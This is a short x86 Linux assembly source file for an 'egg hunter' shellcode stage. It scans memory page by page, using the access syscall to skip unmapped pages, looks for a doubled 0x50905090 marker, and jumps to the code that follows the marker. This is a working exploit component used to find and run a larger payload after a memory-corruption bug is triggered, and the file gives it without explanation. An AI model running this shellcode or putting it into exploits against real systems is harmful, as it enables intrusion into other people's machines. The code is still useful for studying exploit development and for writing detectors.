global _start

section .text

_start:

	xor edx, edx
	xor ecx, ecx
;	mul ecx
;	xor eax, eax

pgalgn:

	or dx, 0xfff

next:

	inc edx
	
	lea ebx, [edx+0x4]

	push byte +0x21

	pop eax
	int 0x80

	cmp al, 0xf2	
	
	jz pgalgn

	mov eax,0x50905090
	mov edi,edx
	scasd

	jnz next

	scasd

	jnz next

	jmp edi
